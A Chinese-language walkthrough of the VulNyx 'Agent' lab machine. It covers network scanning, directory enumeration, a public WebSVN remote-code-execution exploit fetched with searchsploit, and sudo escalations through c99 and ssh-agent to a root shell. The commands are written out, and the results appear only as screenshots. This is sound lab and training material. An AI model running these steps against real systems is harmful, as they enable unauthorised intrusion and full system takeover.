# 环境

来自[Agent](https://vulnyx.com/#Agent)，利用已知websvn漏洞拿shell

# 信息收集

## 主机发现

```bash
sudo nmap -sn 192.168.88.0/24
```

![image-20240723121044383](image/image-20240723121044383.png)

## 端口扫描

```bash
sudo nmap -sT -r -p- 192.168.88.34
```

![image-20240723122516718](image/image-20240723122516718.png)

## 目录扫描

```bash
dirb http://192.168.88.34
```

![image-20240723172750561](image/image-20240723172750561.png)

访问80，是一个Nginx是测试页面

```bash
whatweb http://192.168.88.34/websvn
```

![image-20240723172840390](image/image-20240723172840390.png)

# web渗透

## 利用已知漏洞

```
searchsploit websvn
searchsploit -m 50042
```

![image-20240723173030461](image/image-20240723173030461.png)

有一个远程代码执行，下载漏洞脚本，查看和编辑

![image-20240723173718000](image/image-20240723173718000.png)

```bash
python 50042.py http://192.168.88.34/websvn
```

![image-20240723173820609](image/image-20240723173820609.png)

## 提取

sudo看一下有什么权限

![image-20240723174715113](image/image-20240723174715113.png)

可以看到dustin免密执行[c99](https://gtfobins.github.io/gtfobins/c99/)提权

```bash
sudo -u dustin /usr/bin/c99 -wrapper /bin/sh,-s .
```

![image-20240723174820584](image/image-20240723174820584.png)

拿下dustin用户，再看一下sudo

![image-20240723174909941](image/image-20240723174909941.png)

[ssh-agent](https://gtfobins.github.io/gtfobins/ssh-agent/)提权

```bash
sudo /usr/bin/ssh-agent /bin/bash
```

![image-20240723175121341](image/image-20240723175121341.png)